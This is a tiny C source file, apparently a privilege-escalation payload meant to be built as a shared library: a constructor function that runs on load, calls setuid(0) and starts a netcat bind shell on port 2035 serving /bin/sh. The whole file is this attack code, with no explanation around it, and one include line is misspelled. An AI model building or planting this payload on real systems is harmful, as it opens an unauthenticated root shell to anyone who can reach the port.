#include <stdio.h>
#include <stlib.h>
#include <sys/types.h>
#include <unistd.h>

__attribute__((__constructor__)) int bind_shell(void){	
	setuid(0);
	system("nc -e /bin/sh -lvp 2035");
	return 0;
} 